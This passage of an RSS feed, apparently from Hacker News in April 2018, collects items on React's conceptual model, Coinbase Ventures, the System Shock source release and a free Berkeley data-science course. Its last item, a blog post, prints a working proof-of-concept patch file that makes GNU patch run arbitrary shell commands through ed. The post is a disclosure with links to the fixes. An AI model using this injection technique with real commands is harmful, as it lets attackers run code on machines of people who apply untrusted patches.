    &lt;span class=&quot;pl-smi&quot;&gt;children&lt;/span&gt;.&lt;span class=&quot;pl-en&quot;&gt;map&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;child&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;pl-smi&quot;&gt;child&lt;/span&gt;.&lt;span class=&quot;pl-en&quot;&gt;continuation&lt;/span&gt;(
      &lt;span class=&quot;pl-smi&quot;&gt;stateMap&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;get&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;child&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;key&lt;/span&gt;),
      updateState,
      &lt;span class=&quot;pl-smi&quot;&gt;memoizationCache&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;get&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;child&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;key&lt;/span&gt;)
    ))
  );
}

&lt;span class=&quot;pl-k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;MemoizedFancyNameBox&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;memoize&lt;/span&gt;(FancyNameBox);
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Algebraic Effects&lt;/h2&gt;
&lt;p&gt;It turns out that it is kind of a PITA to pass every little value you might need through several levels of abstractions. It is kind of nice to sometimes have a shortcut to pass things between two abstractions without involving the intermediates. In React we call this &quot;context&quot;.&lt;/p&gt;
&lt;p&gt;Sometimes the data dependencies don't neatly follow the abstraction tree. For example, in layout algorithms you need to know something about the size of your children before you can completely fulfill their position.&lt;/p&gt;
&lt;p&gt;Now, this example is a bit &quot;out there&quot;. I'll use &lt;a href=&quot;http://math.andrej.com/eff/&quot; rel=&quot;nofollow&quot;&gt;Algebraic Effects&lt;/a&gt; as &lt;a href=&quot;https://esdiscuss.org/topic/one-shot-delimited-continuations-with-effect-handlers&quot; rel=&quot;nofollow&quot;&gt;proposed for ECMAScript&lt;/a&gt;. If you're familiar with functional programming, they're avoiding the intermediate ceremony imposed by monads.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;ThemeBorderColorRequest&lt;/span&gt;() { }

&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;FancyBox&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;children&lt;/span&gt;) {
  &lt;span class=&quot;pl-k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;color&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; raise &lt;span class=&quot;pl-k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;ThemeBorderColorRequest&lt;/span&gt;();
  &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; {
    borderWidth&lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;1px&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;,
    borderColor&lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt; color,
    children&lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt; children
  };
}

&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;BlueTheme&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;children&lt;/span&gt;) {
  &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;try&lt;/span&gt; {
    &lt;span class=&quot;pl-en&quot;&gt;children&lt;/span&gt;();
  } &lt;span class=&quot;pl-k&quot;&gt;catch&lt;/span&gt; effect ThemeBorderColorRequest &lt;span class=&quot;pl-k&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;&amp;gt;&lt;/span&gt; [, continuation] {
    &lt;span class=&quot;pl-en&quot;&gt;continuation&lt;/span&gt;(&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;blue&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;);
  }
}

&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;App&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;) {
  &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;BlueTheme&lt;/span&gt;(
    &lt;span class=&quot;pl-smi&quot;&gt;FancyUserList&lt;/span&gt;.&lt;span class=&quot;pl-en&quot;&gt;bind&lt;/span&gt;(&lt;span class=&quot;pl-c1&quot;&gt;null&lt;/span&gt;, &lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;users&lt;/span&gt;)
  );
}
&lt;/pre&gt;&lt;/div&gt;
&lt;/article&gt;</description>
<pubDate>Thu, 05 Apr 2018 22:05:53 +0000</pubDate>
<dc:creator>swyx</dc:creator>
<og:image>https://avatars2.githubusercontent.com/u/6412038?s=400&amp;v=4</og:image>
<og:type>object</og:type>
<og:title>reactjs/react-basic</og:title>
<og:url>https://github.com/reactjs/react-basic</og:url>
<og:description>react-basic - A description of the conceptual model of React without implementation burden.</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://github.com/reactjs/react-basic</dc:identifier>
</item>
<item>
<title>Coinbase Ventures</title>
<link>https://blog.coinbase.com/introducing-coinbase-ventures-c67865a1d2fe</link>
<guid isPermaLink="true" >https://blog.coinbase.com/introducing-coinbase-ventures-c67865a1d2fe</guid>
<description>&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;1*msgUxs_6q_uRHEBQasxcEw.png&quot; data-width=&quot;1200&quot; data-height=&quot;800&quot; data-action=&quot;zoom&quot; data-action-value=&quot;1*msgUxs_6q_uRHEBQasxcEw.png&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/1*msgUxs_6q_uRHEBQasxcEw.png&quot;/&gt;&lt;/div&gt;
&lt;p name=&quot;0766&quot; id=&quot;0766&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;Here at Coinbase, we’re committed to creating an open financial system for the world. We’re hard at work building our own set of products. And we’re also eagerly rooting for the best and brightest minds in the crypto space, both in and outside of Coinbase, to develop products and services that create meaningful user and customer value.&lt;/p&gt;
&lt;p name=&quot;95d3&quot; id=&quot;95d3&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;As &lt;a href=&quot;https://twitter.com/VitalikButerin/status/940744724431982594&quot; data-href=&quot;https://twitter.com/VitalikButerin/status/940744724431982594&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;Vitalik said so well in December last year&lt;/a&gt;, the digital currency ecosystem has the opportunity to transform the lives of billions of people, but we have only just scratched the surface of what’s possible.&lt;/p&gt;
&lt;p name=&quot;8980&quot; id=&quot;8980&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;That’s why today, we’re announcing the formation of Coinbase Ventures. We’ll be providing financing to promising early stage companies that have the teams and ideas that can move the space forward in a positive, meaningful way.&lt;/p&gt;
&lt;p name=&quot;682b&quot; id=&quot;682b&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;At least in the beginning, our goal is simply to help the most compelling companies in the space to flourish. This means that we don’t have the strategic requirement of formalizing partner relationships with such companies, as some corporate venture programs do. Our focus is on building strong relationships and helping to spur on the development of the ecosystem.&lt;/p&gt;
&lt;p name=&quot;e41d&quot; id=&quot;e41d&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;We also have a strong Coinbase alumni network, which we’re very proud of. People who have worked at Coinbase are encouraged to think entrepreneurially, and you can expect that we’ll enthusiastically invest in ideas from our own alumni network.&lt;/p&gt;
&lt;p name=&quot;75a2&quot; id=&quot;75a2&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;You may also see us invest in companies that ostensibly look competitive with Coinbase. There may be nuance to the way these startups are building out their products. Or, in some cases, we may be comfortable investing in companies that are potentially competitive, because it’s in everyone’s interest to see the ecosystem innovate. We’re taking a long term view of the space, and we believe that multiple approaches are healthy and good.&lt;/p&gt;
&lt;p name=&quot;4f85&quot; id=&quot;4f85&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;In short, it’s in all of our interest to see this space evolve, expand and mature. We’ll learn a lot along the way, and we’re excited to get started.&lt;/p&gt;
&lt;p name=&quot;86ce&quot; id=&quot;86ce&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Stay tuned!&lt;/p&gt;
&lt;p name=&quot;cb50&quot; id=&quot;cb50&quot; class=&quot;graf graf--p graf-after--p graf--trailing&quot;&gt;&lt;em class=&quot;markup--em markup--p-em&quot;&gt;Please note that we are not offering favored asset status to any companies we’ll invest in. As always, we’ll follow the&lt;/em&gt; &lt;a href=&quot;https://www.gdax.com/static/digital-asset-framework-2017-11.pdf&quot; data-href=&quot;https://www.gdax.com/static/digital-asset-framework-2017-11.pdf&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;&lt;em class=&quot;markup--em markup--p-em&quot;&gt;Digital Asset Framework&lt;/em&gt;&lt;/a&gt; &lt;em class=&quot;markup--em markup--p-em&quot;&gt;to add any new assets to the platform.&lt;/em&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 05 Apr 2018 21:56:57 +0000</pubDate>
<dc:creator>coinwoke</dc:creator>
<og:title>Introducing Coinbase Ventures – The Coinbase Blog</og:title>
<og:url>https://blog.coinbase.com/introducing-coinbase-ventures-c67865a1d2fe</og:url>
<og:image>https://cdn-images-1.medium.com/max/1200/1*msgUxs_6q_uRHEBQasxcEw.png</og:image>
<og:description>Here at Coinbase, we’re committed to creating an open financial system for the world. We’re hard at work building our own set of products…</og:description>
<og:type>article</og:type>
<dc:format>text/html</dc:format>
<dc:identifier>https://blog.coinbase.com/introducing-coinbase-ventures-c67865a1d2fe?gi=ca7f9d9ceb62</dc:identifier>
</item>
<item>
<title>System Shock 1 source code released under GPL</title>
<link>https://github.com/NightDiveStudios/shockmac</link>
<guid isPermaLink="true" >https://github.com/NightDiveStudios/shockmac</guid>
<description>&lt;h3&gt;README.md&lt;/h3&gt;
&lt;article class=&quot;markdown-body entry-content&quot; itemprop=&quot;text&quot;&gt;
&lt;p&gt;Copyright 2015-2018, Night Dive Studios, Incorporated.&lt;/p&gt;
&lt;p&gt;This file contains the following sections:&lt;/p&gt;
&lt;p&gt;GENERAL NOTES LICENSE&lt;/p&gt;

&lt;h2&gt;Game data and patching:&lt;/h2&gt;
&lt;p&gt;This source release does not contain any game data, the game data is still covered by the original EULA and must be obeyed as usual.&lt;/p&gt;
&lt;h2&gt;Compiling on MacOS 9:&lt;/h2&gt;
&lt;p&gt;A project file for Metrowerks Codewarrior is provided in ShockMac/Shock.µ&lt;/p&gt;
&lt;p&gt;You will need a PowerPC to build the Mac version of System Shock. Fortunately, there are emulators out there that are able to run PowerPC Mac Applications, like SheepShaver. You also need Metrowerks CodeWarrior 10 Tools to build the project and Stuffit Expander to unpack the project files and source code. The game was initially built with an older version of CodeWarrior, but we tested it with CW 10 Gold Tools (IDE 1.7) and it was able to build a working executable. Things you will need:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;A PowerMac or an emulator like SheepShaver;&lt;/li&gt;
&lt;li&gt;CodeWarrior for PowerPC (CW 10 Gold Tools works)&lt;/li&gt;
&lt;li&gt;The original Mac System Shock data.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;About the source code storage:&lt;/p&gt;
&lt;p&gt;The System Shock source code and project files are stored in the Macintosh file system, which implies the usage of two forks for each file, a data fork and a resource fork (as well as a metadata section). For that reason, we decided to include both the compressed files and uncompressed files. The uncompressed files are stored in the ShockMac folder. Inside each folder there are two subfolders: one named &quot;.rsrc&quot;, which stores the resource fork for each file, and another named &quot;.finf&quot;, which stores the metada for every file. The files can also be found compressed inside &quot;ShockMac.sit&quot; under the Stuffit format. This format allows storeing both forks and metada information for every file.&lt;/p&gt;
&lt;p&gt;About the source code organization:&lt;/p&gt;
&lt;p&gt;The source code is split into three sections: Game code, Mac code and Libraries.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Game code is related to System Shock-specific code, like enemy AI, level rendering, etc.&lt;/li&gt;
&lt;li&gt;Mac code is related to Macintosh-specific code, like the typical user interface and internal behavior.&lt;/li&gt;
&lt;li&gt;Libraries are related to code shared by other Looking Glass games, like 2D and 3D rendering, sound, input, resources, palette etc.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;How to unpack the project:&lt;/p&gt;
&lt;p&gt;In your Mac, open ShockMac.sit using a program capable of reading Stuffit packed files. After unpacking it, a folder named ShockMac will be generated with the contents inside it.&lt;/p&gt;
&lt;p&gt;How to compile:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Double-click on the CodeWarrior IDE 1.7 icon to start the IDE&lt;/li&gt;
&lt;li&gt;Open one of the projects inside the folder ShockMac:Libraries&lt;/li&gt;
&lt;li&gt;Click on Project -&amp;gt; Make to build the library.&lt;/li&gt;
&lt;li&gt;Move the generated library file to the folder ShockMac:Lib&lt;/li&gt;
&lt;li&gt;Close the project by clicking on File -&amp;gt; Close&lt;/li&gt;
&lt;li&gt;Repeat steps (2) to (5) for the following projects:
&lt;ul&gt;&lt;li&gt;ShockMac:Libraries:2d:2dLibPPC.µ&lt;/li&gt;
&lt;li&gt;ShockMac:Libraries:3d:3dLibPPC.µ&lt;/li&gt;
&lt;li&gt;ShockMac:Libraries:DSTRUCT:DSTRUCT.µ&lt;/li&gt;
&lt;li&gt;ShockMac:Libraries:EDMS:EDMS.µ&lt;/li&gt;
&lt;li&gt;ShockMac:Libraries:FIX:FIX.µ&lt;/li&gt;
&lt;li&gt;ShockMac:Libraries:FIXPP:FIXPP.µ&lt;/li&gt;
&lt;li&gt;ShockMac:Libraries:INPUT:INPUT.µ&lt;/li&gt;
&lt;li&gt;ShockMac:Libraries:LG:LG.µ&lt;/li&gt;
&lt;li&gt;ShockMac:Libraries:PALETTE:PALETTE.µ&lt;/li&gt;
&lt;li&gt;ShockMac:Libraries:RES:RES.µ&lt;/li&gt;
&lt;li&gt;ShockMac:Libraries:RND:RND.µ&lt;/li&gt;
&lt;li&gt;ShockMac:Libraries:SND:SND.µ&lt;/li&gt;
&lt;li&gt;ShockMac:Libraries:UI:UI.µ&lt;/li&gt;
&lt;li&gt;ShockMac:Libraries:VOX:VOX.µ&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Open the project ShockMac:LIB:LGHeadersPPC.µ&lt;/li&gt;
&lt;li&gt;Precompile by clicking on Project -&amp;gt; Precompile&lt;/li&gt;
&lt;li&gt;Close the project&lt;/li&gt;
&lt;li&gt;Open the project ShockMac:Shock.µ&lt;/li&gt;
&lt;li&gt;Click on Project -&amp;gt; Make to build the game.&lt;/li&gt;
&lt;li&gt;Make sure the game resources are in the folder ShockMac:Data&lt;/li&gt;
&lt;li&gt;Launch the game.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The System Shock source code is available under the terms of the GNU General Public License v3.0&lt;/p&gt;
&lt;p&gt;See COPYING.txt for the GNU GENERAL PUBLIC LICENSE&lt;/p&gt;
&lt;/article&gt;</description>
<pubDate>Thu, 05 Apr 2018 21:41:23 +0000</pubDate>
<dc:creator>jsheard</dc:creator>
<og:image>https://avatars2.githubusercontent.com/u/38115186?s=400&amp;v=4</og:image>
<og:type>object</og:type>
<og:title>NightDiveStudios/shockmac</og:title>
<og:url>https://github.com/NightDiveStudios/shockmac</og:url>
<og:description>shockmac - System Shock (PowerMac version / Official GPL Release)</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://github.com/NightDiveStudios/shockmac</dc:identifier>
</item>
<item>
<title>Berkeley offers its data science course online for free</title>
<link>http://news.berkeley.edu/2018/03/29/berkeley-offers-its-fastest-growing-course-data-science-online-for-free/</link>
<guid isPermaLink="true" >http://news.berkeley.edu/2018/03/29/berkeley-offers-its-fastest-growing-course-data-science-online-for-free/</guid>
<description>&lt;p&gt;The fastest-growing course in UC Berkeley’s history — Foundations of Data Science — is being offered free online this spring for the first time through the campus’s online education hub, edX.&lt;/p&gt;
&lt;p&gt;Data science is becoming important to more and more people because the world is increasingly data-driven — and not just science and tech but the humanities, business and government.&lt;/p&gt;
&lt;div id=&quot;attachment_67446&quot; class=&quot;wp-caption alignleft&quot;&gt;&lt;a href=&quot;https://news.berkeley.edu/wp-content/uploads/2018/03/datascience-410.jpg&quot; data-rel=&quot;lightbox-0&quot; title=&quot;&quot;&gt;&lt;img class=&quot;size-full wp-image-67446&quot; src=&quot;https://news.berkeley.edu/wp-content/uploads/2018/03/datascience-410.jpg&quot; alt=&quot;David Wagner, Ani Adhikari, John DeNero&quot; width=&quot;410&quot; height=&quot;275&quot;/&gt;&lt;/a&gt;
&lt;p class=&quot;wp-caption-text&quot;&gt;Data 8X instructors David Wagner, Ani Adhikari and John DeNero&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;“You’ll learn to program when studying data science — but not for the primary purpose of building apps or games,” says Berkeley computer science Professor John DeNero. “Instead, we use programming to understand the world around us.”&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.edx.org/professional-certificate/berkeleyx-foundations-of-data-science#courses&quot;&gt;The course — Data 8X&lt;/a&gt; (Foundations of Data Science) — covers everything from testing hypotheses, applying statistical inferences, visualizing distributions and drawing conclusions, all while coding in Python and using real-world data sets. One lesson might take economic data from different countries over the years to track global economic growth. The next might use a data set of cell samples to create a classification algorithm that can diagnose breast cancer. (Learn more from &lt;a href=&quot;https://data.berkeley.edu/education/data-8x&quot;&gt;a video on the Berkeley data science website&lt;/a&gt;.)&lt;/p&gt;
&lt;p&gt;The online program is based on the Foundations of Data Science course that Berkeley launched on campus in 2015 and now has more than 1,000 students enrolling every semester.&lt;/p&gt;
&lt;p&gt;The intent is “helping students from any major or any background to address questions that interest them, using the powerful tools of data science,” Provost Paul Alivisatos &lt;a href=&quot;http://docs.house.gov/meetings/SY/SY15/20170726/106330/HHRG-115-SY15-Wstate-AlivisatosA-20170726.pdf&quot;&gt;told a congressional subcommittee on research and technology&lt;/a&gt; in July 2017. “From linguistics to chemistry, and from history to economics, students from over 60 majors have responded, and this is the fastest-growing program in the history of Berkeley…”&lt;/p&gt;
&lt;p&gt;The Foundations of Data Science edX Professional Certificate program is a sequence of three five-week courses taught by three winners of Berkeley’s top teaching honor, the Distinguished Teaching Award: &lt;a href=&quot;https://www.edx.org/bio/john-denero&quot;&gt;DeNero&lt;/a&gt;, statistics professor &lt;a href=&quot;https://www.edx.org/bio/ani-adhikari-0&quot;&gt;Ani Adhikari&lt;/a&gt; and computer science professor &lt;a href=&quot;http://people.eecs.berkeley.edu/~daw/&quot;&gt;David Wagner&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;“&lt;span&gt;It’s exciting to be part of an initiative that brings data science to all, regardless of their background&lt;/span&gt;,” says Adhikari&lt;strong&gt;. “&lt;/strong&gt;&lt;span&gt;After all, everyone has to be able to reason based on data and to gain insight from data. And data science itself will benefit from diverse perspectives about what’s important. Our goal is to bring data science to the widest possible audience.”&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Anyone in the world can enroll for free; learners who want to earn the certificate will need to pay.&lt;/p&gt;
&lt;p&gt;The first of the three parts starts at 9 a.m. (PDT) on Monday, April 2. &lt;a href=&quot;https://www.edx.org/course/foundations-data-science-computational-uc-berkeleyx-data8-1x&quot;&gt;Enrollment&lt;/a&gt; will remain open after the course begins.&lt;/p&gt;

</description>
<pubDate>Thu, 05 Apr 2018 19:11:11 +0000</pubDate>
<dc:creator>seycombi</dc:creator>
<og:type>article</og:type>
<og:title>Berkeley offers its fastest-growing course – data science – online, for free</og:title>
<og:url>http://news.berkeley.edu/2018/03/29/berkeley-offers-its-fastest-growing-course-data-science-online-for-free/</og:url>
<og:description>Data science is increasingly popular at Berkeley because the world is increasingly data-driven</og:description>
<og:image>http://news.berkeley.edu/wp-content/uploads/2018/03/datascience-750.jpg</og:image>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://news.berkeley.edu/2018/03/29/berkeley-offers-its-fastest-growing-course-data-science-online-for-free/</dc:identifier>
</item>
<item>
<title>Patch runs ed, and ed can run anything</title>
<link>http://rachelbythebay.com/w/2018/04/05/bangpatch/</link>
<guid isPermaLink="true" >http://rachelbythebay.com/w/2018/04/05/bangpatch/</guid>
<description>&lt;p&gt;Okay, this is kind of awesome, if you like watching the world burn.&lt;/p&gt;
&lt;p&gt;The short version is: patch runs ed... and ed can run arbitrary commands, including when it's called from patch.&lt;/p&gt;
&lt;p&gt;Check this out. I've taken the proof of concept and changed it slightly:&lt;/p&gt;
&lt;pre&gt;
$ cat evil.patch 
--- /dev/null   2018-13-37 13:37:37.000000000 +0100                            
+++ b/beep.c    2018-13-37 13:38:38.000000000 +0100                            
1337a                                                                          
1,112d                                                                         
!touch /tmp/0wned; ls -la /tmp/0wned
.                                                                              
$ patch &amp;lt; evil.patch 
?
?
-rw-r--r-- 1 edu users 0 Apr  5 10:42 /tmp/0wned
?
patch: **** /usr/bin/ed FAILED
$ 
&lt;/pre&gt;
&lt;p&gt;This came up as part of the discussion on the &quot;beep exploit&quot; yesterday. I found it buried in the HN /new queue as a simple &lt;a href=&quot;https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=894667#19&quot;&gt;link to the Debian bug tracker&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;This seems far too good to leave hidden in there.&lt;/p&gt;
&lt;p&gt;Subprocesses, am I right?&lt;/p&gt;
&lt;p&gt;Late update: it looks like FreeBSD &lt;a href=&quot;https://www.freebsd.org/security/advisories/FreeBSD-SA-15:18.bsdpatch.asc&quot;&gt;fixed this same sort of thing&lt;/a&gt; in 2015. GNU patch, however (shown above), clearly has not.&lt;/p&gt;
&lt;p&gt;Another update: OpenBSD also &lt;a href=&quot;https://ftp.openbsd.org/pub/OpenBSD/patches/5.7/common/013_patch.patch.sig&quot;&gt;patched it&lt;/a&gt; in 2015. It looks like they had it first, which I suppose makes sense. Also, I'm hearing it can't exec other programs any more, which is pretty awesome. That's the right way to close this kind of door.&lt;/p&gt;
</description>
<pubDate>Thu, 05 Apr 2018 18:19:47 +0000</pubDate>
<dc:creator>akerl_</dc:creator>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://rachelbythebay.com/w/2018/04/05/bangpatch/</dc:identifier>
</item>
</channel>
</rss>